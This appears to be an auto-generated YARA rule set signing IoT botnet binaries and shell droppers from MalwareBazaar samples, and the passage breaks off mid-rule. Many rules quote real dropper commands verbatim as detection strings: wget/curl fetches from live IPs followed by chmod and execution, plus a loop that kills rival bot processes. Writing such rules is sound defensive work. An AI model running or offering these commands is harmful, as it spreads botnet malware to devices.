/*
   YARA Rule Set
   Author: Sameer P Sheik
   Date: 2025-01-08
   Identifier: evidences
   Reference: https://datalake.abuse.ch/malware-bazaar/daily/
*/

/* Rule Set ----------------------------------------------------------------- */

rule sig_061c6c1a2ff31f6d639592c9c881e9ce1a10926c1850e3bc1a82c5ae468ae931 {
   meta:
      description = "evidences - file 061c6c1a2ff31f6d639592c9c881e9ce1a10926c1850e3bc1a82c5ae468ae931.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "061c6c1a2ff31f6d639592c9c881e9ce1a10926c1850e3bc1a82c5ae468ae931"
   strings:
      $s1 = "User-Agent: wget (dlr)" fullword ascii
      $s2 = "Host: 127.0.0.1" fullword ascii
      $s3 = "GET /2 HTTP/1.1" fullword ascii
      $s4 = ".reginfo" fullword ascii
      $s5 = ".mdebug.abi32" fullword ascii
      $s6 = "GCC: (GNU) 3.3.2" fullword ascii
      $s7 = "GCC: (GNU) 4.2.1" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 30KB and
      all of them
}

rule sig_07c5a29efa7987474eef1ed539b016b1ea731e5f6e0caac40ef0c96094eb6219 {
   meta:
      description = "evidences - file 07c5a29efa7987474eef1ed539b016b1ea731e5f6e0caac40ef0c96094eb6219.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "07c5a29efa7987474eef1ed539b016b1ea731e5f6e0caac40ef0c96094eb6219"
   strings:
      $s1 = "User-Agent: wget (dlr)" fullword ascii
      $s2 = "Host: 127.0.0.1" fullword ascii
      $s3 = "GET /12 HTTP/1.1" fullword ascii
      $s4 = ".reginfo" fullword ascii
      $s5 = ".mdebug.abi32" fullword ascii
      $s6 = "GCC: (GNU) 3.3.2" fullword ascii
      $s7 = "GCC: (GNU) 4.2.1" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 30KB and
      all of them
}

rule sig_529a87fb4d05dff414869e8b21d7160abc97bd1c891e595b514d02f2e85ef6a7 {
   meta:
      description = "evidences - file 529a87fb4d05dff414869e8b21d7160abc97bd1c891e595b514d02f2e85ef6a7.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "529a87fb4d05dff414869e8b21d7160abc97bd1c891e595b514d02f2e85ef6a7"
   strings:
      $s1 = "User-Agent: wget (dlr)" fullword ascii
      $s2 = "Host: 127.0.0.1" fullword ascii
      $s3 = "GET /4 HTTP/1.1" fullword ascii
      $s4 = ".ARM.attributes" fullword ascii
      $s5 = "GCC: (GNU) 3.3.2 20031005 (Debian prerelease)" fullword ascii
      $s6 = ".ARM.extab" fullword ascii
      $s7 = ".ARM.exidx" fullword ascii
      $s8 = "GCC: (GNU) 4.2.1" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 20KB and
      all of them
}

rule sig_7c4f5db115678d04d24025c8588446e53c15ecfc480cd843747a87ed93a4cf0a {
   meta:
      description = "evidences - file 7c4f5db115678d04d24025c8588446e53c15ecfc480cd843747a87ed93a4cf0a.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "7c4f5db115678d04d24025c8588446e53c15ecfc480cd843747a87ed93a4cf0a"
   strings:
      $s1 = "User-Agent: wget (dlr)" fullword ascii
      $s2 = "Host: 127.0.0.1" fullword ascii
      $s3 = "GET /5 HTTP/1.1" fullword ascii
      $s4 = ".ARM.attributes" fullword ascii
      $s5 = "GCC: (GNU) 3.3.2 20031005 (Debian prerelease)" fullword ascii
      $s6 = ".ARM.extab" fullword ascii
      $s7 = ".ARM.exidx" fullword ascii
      $s8 = "GCC: (GNU) 4.2.1" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 20KB and
      all of them
}

rule sig_97dece0e878e505d7e883a63546c252402f9cae1c88615f3a3ad9dbd4526ae34 {
   meta:
      description = "evidences - file 97dece0e878e505d7e883a63546c252402f9cae1c88615f3a3ad9dbd4526ae34.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "97dece0e878e505d7e883a63546c252402f9cae1c88615f3a3ad9dbd4526ae34"
   strings:
      $s1 = "username=admin&password=password123&email=admin@example.com&submit=login" fullword ascii
      $s2 = "e != EDEADLK || (kind != PTHREAD_MUTEX_ERRORCHECK_NP && kind != PTHREAD_MUTEX_RECURSIVE_NP)" fullword ascii
      $s3 = "cy == 0 || p.tmp[p.tmpsize - 1] < 20" fullword ascii
      $s4 = "PTHREAD_MUTEX_TYPE (mutex) == PTHREAD_MUTEX_ERRORCHECK_NP" fullword ascii
      $s5 = "type == PTHREAD_MUTEX_ERRORCHECK_NP" fullword ascii
      $s6 = "__pthread_mutex_unlock_usercnt" fullword ascii
      $s7 = "glibc.pthread.mutex_spin_count" fullword ascii
      $s8 = "?33333333" fullword ascii /* reversed goodware string '33333333?' */ /* hex encoded string '3333' */
      $s9 = "Unexpected error %d on netlink descriptor %d (address family %d)." fullword ascii
      $s10 = "version_lock_mutex" fullword ascii
      $s11 = "relocation processing: %s%s" fullword ascii
      $s12 = "pthread_mutex_unlock.c" fullword ascii
      $s13 = "___pthread_mutex_lock" fullword ascii
      $s14 = "__pthread_mutex_unlock_full" fullword ascii
      $s15 = "___pthread_mutex_trylock" fullword ascii
      $s16 = "pthread_mutex_trylock.o" fullword ascii
      $s17 = "pthread_mutex_trylock.c" fullword ascii
      $s18 = "__pthread_mutex_lock_full" fullword ascii
      $s19 = "pthread_mutex_lock.o" fullword ascii
      $s20 = "pthread_mutex_lock.c" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 2000KB and
      8 of them
}

rule ba3841eed64971a5f759c98a7ea508559390f75e86e4a915df684dc62f49d90c {
   meta:
      description = "evidences - file ba3841eed64971a5f759c98a7ea508559390f75e86e4a915df684dc62f49d90c.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "ba3841eed64971a5f759c98a7ea508559390f75e86e4a915df684dc62f49d90c"
   strings:
      $s1 = "User-Agent: wget (dlr)" fullword ascii
      $s2 = "Host: 127.0.0.1" fullword ascii
      $s3 = "GET /6 HTTP/1.1" fullword ascii
      $s4 = ".ARM.attributes" fullword ascii
      $s5 = "GCC: (GNU) 3.3.2 20031005 (Debian prerelease)" fullword ascii
      $s6 = ".ARM.extab" fullword ascii
      $s7 = ".ARM.exidx" fullword ascii
      $s8 = "GCC: (GNU) 4.2.1" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 50KB and
      all of them
}

rule c3088f54c5d6fc0c43108a084d428c49ed2ed9f7fb45bece7b29cdfdfe9e9eda {
   meta:
      description = "evidences - file c3088f54c5d6fc0c43108a084d428c49ed2ed9f7fb45bece7b29cdfdfe9e9eda.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "c3088f54c5d6fc0c43108a084d428c49ed2ed9f7fb45bece7b29cdfdfe9e9eda"
   strings:
      $s1 = "User-Agent: wget (dlr)" fullword ascii
      $s2 = "Host: 127.0.0.1" fullword ascii
      $s3 = "GET /3 HTTP/1.1" fullword ascii
      $s4 = "GCC: (GNU) 3.3.2 20031005 (Debian prerelease)" fullword ascii
      $s5 = "GCC: (GNU) 4.2.1" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 20KB and
      all of them
}

rule e5e475db5076e112f69b61ccb36aaedfbb7cac54a03a4a2b3c6a4a9317af2196 {
   meta:
      description = "evidences - file e5e475db5076e112f69b61ccb36aaedfbb7cac54a03a4a2b3c6a4a9317af2196.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "e5e475db5076e112f69b61ccb36aaedfbb7cac54a03a4a2b3c6a4a9317af2196"
   strings:
      $s1 = "__pthread_key_create" fullword ascii
      $s2 = "sched_getaffinity" fullword ascii
      $s3 = "?3\"^22=2" fullword ascii /* hex encoded string '2"' */
      $s4 = "0QIrCf>]A" fullword ascii
      $s5 = "cvv:56,=w>66>5<8)0w:64),-<+cmmj%joii%hYM" fullword ascii
      $s6 = "BGBOP!." fullword ascii
      $s7 = "=Rd:\\/0" fullword ascii
      $s8 = "l:\"?AJn" fullword ascii
      $s9 = "=o:\\oUZ" fullword ascii
      $s10 = ".eh_frame_hdr" fullword ascii
      $s11 = "libpthread.so.0" fullword ascii
      $s12 = "SAWARVA" fullword ascii
      $s13 = "3Qftp{" fullword ascii
      $s14 = "- hlB>" fullword ascii
      $s15 = "XD>G1%Q%" fullword ascii
      $s16 = "u /M^I2" fullword ascii
      $s17 = "lB%R%X" fullword ascii
      $s18 = "TgXRqI7" fullword ascii
      $s19 = " /P7C8" fullword ascii
      $s20 = " -uw>-`" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 11000KB and
      8 of them
}

rule sig_06240d6f9990a658a2ff844a1f591256c6088ac086dc036e700f73f55504c292 {
   meta:
      description = "evidences - file 06240d6f9990a658a2ff844a1f591256c6088ac086dc036e700f73f55504c292.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "06240d6f9990a658a2ff844a1f591256c6088ac086dc036e700f73f55504c292"
   strings:
      $s1 = "cd /tmp; /bin/busybox wget http://103.136.41.100/t3; chmod +x t3; chmod 777 t3; ./t3 selfrep.arm.wget;" fullword ascii
      $s2 = "cd /tmp; /bin/busybox wget http://103.136.41.100/t2; chmod +x t2; chmod 777 t2; ./t2 selfrep.mpsl.wget;" fullword ascii
      $s3 = "cd /tmp; /bin/busybox wget http://103.136.41.100/t4; chmod +x t4; chmod 777 t4; ./t4 selfrep.arm5.wget;" fullword ascii
      $s4 = "cd /tmp; /bin/busybox wget http://103.136.41.100/t5; chmod +x t5; chmod 777 t5; ./t5 selfrep.arm6.wget;" fullword ascii
      $s5 = "cd /tmp; /bin/busybox wget http://103.136.41.100/t1; chmod +x t1; chmod 777 t1; ./t1 selfrep.mips.wget;" fullword ascii
      $s6 = "cd /tmp; /bin/busybox wget http://103.136.41.100/t6; chmod +x t6; chmod 777 t6; ./t6 selfrep.arm7.wget;" fullword ascii
      $s7 = "    exe_path=$(readlink -f \"/proc/$pid/exe\" 2> /dev/null)" fullword ascii
      $s8 = "for proc_dir in /proc/[0-9]*; do" fullword ascii
      $s9 = "    if [ -z \"$exe_path\" ]; then" fullword ascii
      $s10 = "        *\"(deleted)\"* | *\"/.\"* | *\"telnetdbot\"* | *\"dvrLocker\"* | *\"acd\"* | *\"dvrHelper\"*)" fullword ascii
      $s11 = "            kill -9 \"$pid\"" fullword ascii
      $s12 = "#!/bin/sh" fullword ascii /* Goodware String - occured 3 times */
      $s13 = "        continue" fullword ascii
   condition:
      uint16(0) == 0x2123 and filesize < 2KB and
      8 of them
}

rule sig_9588242243192b7fd00cb43b138b2f2a8d487b6e3007bbfb2cf2403aac2b5167 {
   meta:
      description = "evidences - file 9588242243192b7fd00cb43b138b2f2a8d487b6e3007bbfb2cf2403aac2b5167.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "9588242243192b7fd00cb43b138b2f2a8d487b6e3007bbfb2cf2403aac2b5167"
   strings:
      $s1 = "cd /tmp; /bin/busybox wget http://103.136.41.100/t3; chmod +x t3; chmod 777 t3; ./t3 selfrep.arm.wget;" fullword ascii
      $s2 = "cd /tmp; /bin/busybox wget http://103.136.41.100/t2; chmod +x t2; chmod 777 t2; ./t2 selfrep.mpsl.wget;" fullword ascii
      $s3 = "cd /tmp; /bin/busybox wget http://103.136.41.100/t4; chmod +x t4; chmod 777 t4; ./t4 selfrep.arm5.wget;" fullword ascii
      $s4 = "cd /tmp; /bin/busybox wget http://103.136.41.100/t5; chmod +x t5; chmod 777 t5; ./t5 selfrep.arm6.wget;" fullword ascii
      $s5 = "cd /tmp; /bin/busybox wget http://103.136.41.100/t1; chmod +x t1; chmod 777 t1; ./t1 selfrep.mips.wget;" fullword ascii
      $s6 = "cd /tmp; /bin/busybox wget http://103.136.41.100/t6; chmod +x t6; chmod 777 t6; ./t6 selfrep.arm7.wget;" fullword ascii
      $s7 = "    exe_path=$(readlink -f \"/proc/$pid/exe\" 2> /dev/null)" fullword ascii
      $s8 = "            echo \"Killing process $pid ($exe_path)\"" fullword ascii
      $s9 = "for proc_dir in /proc/[0-9]*; do" fullword ascii
      $s10 = "    if [ -z \"$exe_path\" ]; then" fullword ascii
      $s11 = "        *\"(deleted)\"* | *\"/.\"* | *\"telnetdbot\"* | *\"dvrLocker\"* | *\"acd\"* | *\"dvrHelper\"*)" fullword ascii
      $s12 = "            kill -9 \"$pid\"" fullword ascii
      $s13 = "#!/bin/sh" fullword ascii /* Goodware String - occured 3 times */
      $s14 = "        continue" fullword ascii
   condition:
      uint16(0) == 0x2123 and filesize < 3KB and
      8 of them
}

rule sig_081dedbfdd521cf24f7b6a8ed747e7106e4a656ae5d33780df65f19d6a65d5a9 {
   meta:
      description = "evidences - file 081dedbfdd521cf24f7b6a8ed747e7106e4a656ae5d33780df65f19d6a65d5a9.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "081dedbfdd521cf24f7b6a8ed747e7106e4a656ae5d33780df65f19d6a65d5a9"
   strings:
      $s1 = "cd /tmp; rm -rf 3; wget http://103.136.41.100/g3; chmod 777 g3; ./g3 multidvr.arm;" fullword ascii
      $s2 = "cd /tmp; rm -rf 1; wget http://103.136.41.100/g1; chmod 777 g1; ./g1 multidvr.mips;" fullword ascii
      $s3 = "cd /tmp; rm -rf 2; wget http://103.136.41.100/g2; chmod 777 g2; ./g2 multidvr.mpsl;" fullword ascii
      $s4 = "cd /tmp; rm -rf 6; wget http://103.136.41.100/g6; chmod 777 g6; ./g6 multidvr.arm7;" fullword ascii
      $s5 = "    exe_path=$(readlink -f \"/proc/$pid/exe\" 2> /dev/null)" fullword ascii
      $s6 = "for proc_dir in /proc/[0-9]*; do" fullword ascii
      $s7 = "    if [ -z \"$exe_path\" ]; then" fullword ascii
      $s8 = "rm -rf m" fullword ascii
      $s9 = "echo \"\" > m" fullword ascii
      $s10 = "        *\"(deleted)\"* | *\"/.\"* | *\"telnetdbot\"* | *\"dvrLocker\"* | *\"acd\"* | *\"dvrHelper\"*)" fullword ascii
      $s11 = "            kill -9 \"$pid\"" fullword ascii
      $s12 = "#!/bin/sh" fullword ascii /* Goodware String - occured 3 times */
      $s13 = "        continue" fullword ascii
   condition:
      uint16(0) == 0x2123 and filesize < 2KB and
      8 of them
}

rule sig_2285df6e099990a09534b394c899a44d5d0f5227a7e961eb64b02deb0a5f04ed {
   meta:
      description = "evidences - file 2285df6e099990a09534b394c899a44d5d0f5227a7e961eb64b02deb0a5f04ed.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "2285df6e099990a09534b394c899a44d5d0f5227a7e961eb64b02deb0a5f04ed"
   strings:
      $s1 = "cd /tmp; curl http://103.136.41.100/t3  -o t3; /bin/busybox chmod +x t3; ./t3 selfrep.arm.curl;" fullword ascii
      $s2 = "cd /tmp; curl http://103.136.41.100/t6  -o t6; /bin/busybox chmod +x t6; ./t6 selfrep.arm7.curl;" fullword ascii
      $s3 = "cd /tmp; curl http://103.136.41.100/t2  -o t2; /bin/busybox chmod +x t2; ./t2 selfrep.mpsl.curl;" fullword ascii
      $s4 = "cd /tmp; curl http://103.136.41.100/t4  -o t4; /bin/busybox chmod +x t4; ./t4 selfrep.arm5.curl;" fullword ascii
      $s5 = "cd /tmp; curl http://103.136.41.100/t1  -o t1; /bin/busybox chmod +x t1; ./t1 selfrep.mips.curl;" fullword ascii
      $s6 = "cd /tmp; curl http://103.136.41.100/t5  -o t5; /bin/busybox chmod +x t5; ./t5 selfrep.arm6.curl;" fullword ascii
      $s7 = "    exe_path=$(readlink -f \"/proc/$pid/exe\" 2> /dev/null)" fullword ascii
      $s8 = "            echo \"Killing process $pid ($exe_path)\"" fullword ascii
      $s9 = "for proc_dir in /proc/[0-9]*; do" fullword ascii
      $s10 = "    if [ -z \"$exe_path\" ]; then" fullword ascii
      $s11 = "        *\"(deleted)\"* | *\"/.\"* | *\"telnetdbot\"* | *\"dvrLocker\"* | *\"acd\"* | *\"dvrHelper\"*)" fullword ascii
      $s12 = "            kill -9 \"$pid\"" fullword ascii
      $s13 = "#!/bin/sh" fullword ascii /* Goodware String - occured 3 times */
      $s14 = "        continue" fullword ascii
   condition:
      uint16(0) == 0x2123 and filesize < 2KB and
      8 of them
}

rule sig_6c2ce066e969d0c675dd041b54676ef522d29b7b9343a0a75ca94e1c29346d8c {
   meta:
      description = "evidences - file 6c2ce066e969d0c675dd041b54676ef522d29b7b9343a0a75ca94e1c29346d8c.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "6c2ce066e969d0c675dd041b54676ef522d29b7b9343a0a75ca94e1c29346d8c"
   strings:
      $s1 = "cd /tmp; rm -rf g3; wget http://103.136.41.100/g3; chmod 777 g3; ./g3 pdvr.arm; " fullword ascii
      $s2 = "cd /tmp; rm -rf g2; wget http://103.136.41.100/g2; chmod 777 g2; ./g2 pdvr.mpsl;" fullword ascii
      $s3 = "cd /tmp; rm -rf g6; wget http://103.136.41.100/g6; chmod 777 g6; ./g6 pdvr.arm7;" fullword ascii
      $s4 = "cd /tmp; rm -rf g1; wget http://103.136.41.100/g1; chmod 777 g1; ./g1 pdvr.mips;" fullword ascii
      $s5 = "    exe_path=$(readlink -f \"/proc/$pid/exe\" 2> /dev/null)" fullword ascii
      $s6 = "            echo \"Killing process $pid ($exe_path)\"" fullword ascii
      $s7 = "for proc_dir in /proc/[0-9]*; do" fullword ascii
      $s8 = "    if [ -z \"$exe_path\" ]; then" fullword ascii
      $s9 = "rm -rf p" fullword ascii
      $s10 = "echo \"\" > p" fullword ascii
      $s11 = "        *\"(deleted)\"* | *\"/.\"* | *\"telnetdbot\"* | *\"dvrLocker\"* | *\"acd\"* | *\"dvrHelper\"*)" fullword ascii
      $s12 = "            kill -9 \"$pid\"" fullword ascii
      $s13 = "#!/bin/sh" fullword ascii /* Goodware String - occured 3 times */
      $s14 = "        continue" fullword ascii
   condition:
      uint16(0) == 0x2123 and filesize < 2KB and
      8 of them
}

rule sig_70a1f6eaf99349bbc42ec40209794b1078d572e09a125eb941af29e6ec0d3bfa {
   meta:
      description = "evidences - file 70a1f6eaf99349bbc42ec40209794b1078d572e09a125eb941af29e6ec0d3bfa.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "70a1f6eaf99349bbc42ec40209794b1078d572e09a125eb941af29e6ec0d3bfa"
   strings:
      $s1 = "cd /tmp; rm -rf 3; wget http://103.136.41.100/3; chmod 777 3; ./3 avtech.arm; rm -rf 3;" fullword ascii
      $s2 = "cd /tmp; rm -rf 12; wget http://103.136.41.100/12; chmod 777 12; ./12 avtech.mips; rm -rf 12;" fullword ascii
      $s3 = "cd /tmp; rm -rf 2; wget http://103.136.41.100/2; chmod 777 2; ./2 avtech.mpsl; rm -rf 2;" fullword ascii
      $s4 = "cd /tmp; rm -rf 6; wget http://103.136.41.100/6; chmod 777 6; ./6 avtech.arm7; rm -rf 6;" fullword ascii
      $s5 = "cd /tmp; rm -rf 4; wget http://103.136.41.100/4; chmod 777 4; ./4 avtech.arm5; rm -rf 4;" fullword ascii
      $s6 = "cd /tmp; rm -rf 5; wget http://103.136.41.100/5; chmod 777 5; ./5 avtech.arm6; rm -rf 5;" fullword ascii
      $s7 = "    exe_path=$(readlink -f \"/proc/$pid/exe\" 2> /dev/null)" fullword ascii
      $s8 = "for proc_dir in /proc/[0-9]*; do" fullword ascii
      $s9 = "    if [ -z \"$exe_path\" ]; then" fullword ascii
      $s10 = "rm -rf av.sh" fullword ascii
      $s11 = "echo \"\" > av.sh" fullword ascii
      $s12 = "        *\"(deleted)\"* | *\"/.\"* | *\"telnetdbot\"* | *\"dvrLocker\"* | *\"acd\"* | *\"dvrHelper\"*)" fullword ascii
      $s13 = "            kill -9 \"$pid\"" fullword ascii
      $s14 = "#!/bin/sh" fullword ascii /* Goodware String - occured 3 times */
      $s15 = "        continue" fullword ascii
   condition:
      uint16(0) == 0x2123 and filesize < 2KB and
      8 of them
}

rule cdd468dd2693ac457dc71927713c20a5d86eaf818c132b4247190d50125922ce {
   meta:
      description = "evidences - file cdd468dd2693ac457dc71927713c20a5d86eaf818c132b4247190d50125922ce.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "cdd468dd2693ac457dc71927713c20a5d86eaf818c132b4247190d50125922ce"
   strings:
      $s1 = "cd /tmp; rm -rf g3; wget http://103.136.41.100/g3; chmod 777 g3; ./g3 lilin.arm;" fullword ascii
      $s2 = "cd /tmp; rm -rf g1; wget http://103.136.41.100/g1; chmod 777 g1; ./g1 lilin.mips;" fullword ascii
      $s3 = "cd /tmp; rm -rf g2; wget http://103.136.41.100/g2; chmod 777 g2; ./g2 lilin.mpsl;" fullword ascii
      $s4 = "cd /tmp; rm -rf g6; wget http://103.136.41.100/g6; chmod 777 g6; ./g6 lilin.arm7;" fullword ascii
      $s5 = "    exe_path=$(readlink -f \"/proc/$pid/exe\" 2> /dev/null)" fullword ascii
      $s6 = "for proc_dir in /proc/[0-9]*; do" fullword ascii
      $s7 = "    if [ -z \"$exe_path\" ]; then" fullword ascii
      $s8 = "rm -rf lil" fullword ascii
      $s9 = "echo \"\" > lil" fullword ascii
      $s10 = "        *\"(deleted)\"* | *\"/.\"* | *\"telnetdbot\"* | *\"dvrLocker\"* | *\"acd\"* | *\"dvrHelper\"*)" fullword ascii
      $s11 = "            kill -9 \"$pid\"" fullword ascii
      $s12 = "#!/bin/sh" fullword ascii /* Goodware String - occured 3 times */
      $s13 = "        continue" fullword ascii
   condition:
      uint16(0) == 0x2123 and filesize < 2KB and
      8 of them
}

rule sig_4efaed6c5b6baac0709992720bdb0419ecb36d1862188ec91c9fe3d22cec9e85 {
   meta:
      description = "evidences - file 4efaed6c5b6baac0709992720bdb0419ecb36d1862188ec91c9fe3d22cec9e85.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "4efaed6c5b6baac0709992720bdb0419ecb36d1862188ec91c9fe3d22cec9e85"
   strings:
      $s1 = "        wget http://104.244.72.37:8000/$BOT || curl -O http://104.244.72.37:8000/$BOT" fullword ascii
      $s2 = "ARCH=$(uname -m)" fullword ascii
      $s3 = "        cd /tmp" fullword ascii
      $s4 = "#!/bin/sh" fullword ascii /* Goodware String - occured 3 times */
      $s5 = "case $ARCH in" fullword ascii
      $s6 = "        rm -rf *" fullword ascii
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      all of them
}

rule sig_766e2dc565defd2ae4857036e98b8a70df7d01ab10480b3d60812c179250d2e4 {
   meta:
      description = "evidences - file 766e2dc565defd2ae4857036e98b8a70df7d01ab10480b3d60812c179250d2e4.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "766e2dc565defd2ae4857036e98b8a70df7d01ab10480b3d60812c179250d2e4"
   strings:
      $s1 = "cd /tmp; rm -rf 3; wget http://45.148.120.242/3; chmod 777 3; ./3 gpon.3; rm -rf 3;" fullword ascii
      $s2 = "cd /tmp; rm -rf 2; wget http://45.148.120.242/2; chmod 777 2; ./2 gpon.2; rm -rf 2;" fullword ascii
      $s3 = "cd /tmp; rm -rf 12; wget http://45.148.120.242/12; chmod 777 12; ./12 gpon.1; rm -rf 1;" fullword ascii
      $s4 = "cd /tmp; rm -rf 6; wget http://45.148.120.242/6; chmod 777 6; ./6 gpon.6; rm -rf 6;" fullword ascii
      $s5 = "rm -rf g" fullword ascii
      $s6 = "echo \"\" > g" fullword ascii
      $s7 = "#!/bin/sh" fullword ascii /* Goodware String - occured 3 times */
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      all of them
}

rule sig_0ad846071ab74504511930aa589b7038abad15eea2004136b67bf9764ac6d7ba {
   meta:
      description = "evidences - file 0ad846071ab74504511930aa589b7038abad15eea2004136b67bf9764ac6d7ba.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "0ad846071ab74504511930aa589b7038abad15eea2004136b67bf9764ac6d7ba"
   strings:
      $s1 = "cd /tmp; wget http://103.136.41.100/3; chmod +x 3; chmod 777 3; ./3 boa.arm;" fullword ascii
      $s2 = "cd /tmp; wget http://103.136.41.100/4; chmod +x 4; chmod 777 4; ./4 boa.arm5;" fullword ascii
      $s3 = "cd /tmp; wget http://103.136.41.100/2; chmod +x 2; chmod 777 2; ./2 boa.mpsl;" fullword ascii
      $s4 = "cd /tmp; wget http://103.136.41.100/12; chmod +x 12; chmod 777 12; ./12 boa.mips;" fullword ascii
      $s5 = "cd /tmp; wget http://103.136.41.100/5; chmod +x 5; chmod 777 5; ./5 boa.arm6;" fullword ascii
      $s6 = "cd /tmp; wget http://103.136.41.100/6; chmod +x 6; chmod 777 6; ./6 boa.arm7;" fullword ascii
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule sig_0d9572d540ccc11e49eb972d67b224239e31393e7fe396ac6620aa44b846a9f6 {
   meta:
      description = "evidences - file 0d9572d540ccc11e49eb972d67b224239e31393e7fe396ac6620aa44b846a9f6.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "0d9572d540ccc11e49eb972d67b224239e31393e7fe396ac6620aa44b846a9f6"
   strings:
      $s1 = "get_kernel_syms" fullword ascii
      $s2 = "klogctl" fullword ascii
      $s3 = "getspent" fullword ascii
      $s4 = "getspnam" fullword ascii
      $s5 = "pmap_getport" fullword ascii
      $s6 = "getspnam_r" fullword ascii
      $s7 = "pmap_getmaps" fullword ascii
      $s8 = "getspent_r" fullword ascii
      $s9 = "fgetgrent_r" fullword ascii
      $s10 = "fgets_unlocked" fullword ascii
      $s11 = "fgetpwent_r" fullword ascii
      $s12 = "putpwent" fullword ascii
      $s13 = "setspent" fullword ascii
      $s14 = "swapoff" fullword ascii
      $s15 = "sigsetmask" fullword ascii
      $s16 = "endspent" fullword ascii
      $s17 = "clnt_pcreateerror" fullword ascii
      $s18 = "authunix_create_default" fullword ascii
      $s19 = "pivot_root" fullword ascii
      $s20 = "clnt_perror" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 60KB and
      8 of them
}

rule fb653fd840b0399cea31986b49b5ceadd28fb739dd2403a8bb05051eea5e5bbc {
   meta:
      description = "evidences - file fb653fd840b0399cea31986b49b5ceadd28fb739dd2403a8bb05051eea5e5bbc.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "fb653fd840b0399cea31986b49b5ceadd28fb739dd2403a8bb05051eea5e5bbc"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\" xmlns:asmv3=\"urn:schemas-microsoft-com:asm.v3\"><a" ascii
      $s2 = "Mozilla/5.0 (compatible; Everything/%s; +https://www.voidtools.com/update/)" fullword ascii
      $s3 = "\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\"></assemblyIdentity></depen" ascii
      $s4 = "https://www.voidtools.com/downloads/" fullword ascii
      $s5 = "https://www.voidtools.com/downloads/#language" fullword ascii
      $s6 = "Directory\\Background\\shell\\%s\\command" fullword ascii
      $s7 = "Directory\\background\\shell\\%s\\command" fullword ascii
      $s8 = "Folder\\shell\\%s\\command" fullword ascii
      $s9 = "yIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Everything\" type=\"win32\"></assemblyIdentity><description>Eve" ascii
      $s10 = "; settings stored in %APPDATA%\\Everything\\Everything.ini" fullword ascii
      $s11 = "Host the pipe server with the security descriptor." fullword ascii
      $s12 = "username:password@host:port" fullword ascii
      $s13 = "https://www.voidtools.com/support/everything/" fullword ascii
      $s14 = "<html><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"><meta name=\"viewport\" content=\"width=512\"><head" ascii
      $s15 = "\\\\.\\PIPE\\Everything Service" fullword ascii
      $s16 = "Auto detect will attempt to read file contents with the associated IFilter." fullword ascii
      $s17 = "Everything Service Debug Log.txt" fullword wide
      $s18 = "Store settings and data in %APPDATA%\\Everything?" fullword ascii
      $s19 = "SERVICE_SERVER_COMMAND_REFS_MONITOR_READ_USN_JOURNAL_DATA read ok %d" fullword ascii
      $s20 = "processed %I64u / %I64u file records" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and 4 of them
}

rule sig_1bc7418009f735fbf6670730f0df5be418dd7fb7bf7e79b36349f3b17d812142 {
   meta:
      description = "evidences - file 1bc7418009f735fbf6670730f0df5be418dd7fb7bf7e79b36349f3b17d812142.unknown"
